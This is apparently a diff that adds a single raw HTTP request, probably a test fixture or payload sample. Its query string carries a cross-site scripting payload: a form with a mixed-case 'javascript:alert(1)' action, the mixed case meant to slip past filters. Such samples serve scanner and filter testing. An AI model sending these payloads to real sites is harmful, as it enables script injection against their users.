@@ -1,0 +1,4 @@
+GET /a?input=<fOrM%20aCtIoN%3D"jAvAsCrIpT:aLeRt(1)"><BuTtOn>X</bUtToN></fOrM> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
